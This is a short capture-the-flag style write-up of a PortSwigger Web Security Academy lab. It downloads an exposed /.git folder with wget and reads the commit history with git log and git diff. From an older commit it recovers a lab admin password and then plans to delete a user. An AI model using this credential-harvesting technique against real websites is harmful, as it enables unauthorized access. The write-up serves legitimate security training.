Link : [Information disclosure in version control history](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history)
Difficulty: Practioner

# Action
First, let download the `/.git` folder to my host so I could use Git with it.
```
wget -r https://0a8b0029035d3221829d475b00be0013.web-security-academy.net/.git
```

Then I use `git log` to view commit history
```
commit e4ee75dc1c0a632beb29f05e54a2f95d46853cbb (HEAD -> master)
Author: Carlos Montoya <carlos@carlos-montoya.net>
Date:   Tue Jun 23 14:05:07 2020 +0000

    Remove admin password from config

commit 536b57a0b6d5265d0929631055d9904149af9cab
Author: Carlos Montoya <carlos@carlos-montoya.net>
Date:   Mon Jun 22 16:23:42 2020 +0000
```

Then I will take the commit hash before they actually remove the admin password from the config and view the diff.
```
git diff <commit hash>
```
```git diff 536b57a0b6d5265d0929631055d9904149af9cab
diff --git a/admin.conf b/admin.conf
deleted file mode 100644
index 911f85a..0000000
--- a/admin.conf
+++ /dev/null
@@ -1 +0,0 @@
-ADMIN_PASSWORD=nfwf9fa5mwqjpl9hg9u7
diff --git a/admin_panel.php b/admin_panel.php
deleted file mode 100644
index 8944e3b..0000000
--- a/admin_panel.php
+++ /dev/null
@@ -1 +0,0 @@
-<?php echo 'TODO: build an amazing admin panel, but remember to check the password!'; ?>
\ No newline at end of file
```
I got the password, time to log in and delete `carlos`
Happy Hacking!#!@#!
